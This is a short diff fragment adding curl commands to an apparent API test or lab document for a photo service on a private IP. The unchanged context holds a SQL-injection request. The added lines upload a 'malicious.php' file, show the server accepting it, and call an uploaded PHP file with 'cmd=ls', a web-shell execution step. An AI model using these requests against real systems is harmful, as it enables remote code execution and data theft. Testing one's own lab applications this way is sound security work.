@@ -155,7 +155,15 @@ curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1%20OR%201%3D1"
   "status": "success"
 }
 
+curl "http://10.5.20.45:8000/api/photos/5f03820f-9ec9-439c-aca2-bb5a00c8faf2.php?user_id=1&cmd=ls"
+
 curl -X GET "http://10.5.20.45:8000/api/photos/b40051e6-de40-42fb-aee5-82646e39f2a8.png" --output downloaded_image.png
+
+curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
+     -H "Content-Type: multipart/form-data" \
+     -F "file=@malicious.php" \
+     -F "user_id=123"
+{"filename":"b124236a-f516-4c1f-a022-408f32e071dc.php","message":"File uploaded successfully","status":"success"}
 
 
 ```
